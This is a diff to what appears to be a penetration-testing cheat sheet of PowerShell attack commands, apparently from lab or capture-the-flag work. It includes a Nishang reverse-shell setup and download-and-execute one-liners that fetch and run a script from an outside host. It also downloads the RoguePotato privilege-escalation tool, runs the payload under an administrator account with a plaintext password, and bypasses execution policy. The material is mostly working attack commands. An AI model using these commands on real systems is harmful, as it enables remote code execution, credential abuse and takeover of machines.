@@ -2,7 +2,7 @@
 
 powershell reverse shell
 
-```text
+```
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
 
 #edit this file to have the required reverse shell at the end
@@ -16,17 +16,19 @@ this line at the end of shell.ps1
 
 # this is what gets us the reverse shell
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1')"
+
+echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1')" | 
 ```
 
 smbserver or powershell download file
 
-```text
+```
 invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
 ```
 
 run as
 
-```text
+```
 $username = "BART\Administrator"
 $password = "3130438f31186fbaf962f407711faddb"
 $secstr = New-Object -TypeName System.Security.SecureString
@@ -35,8 +37,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1') } -Credential $cred -Computer localhost
 ```
 
-```text
+```
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 ```
-
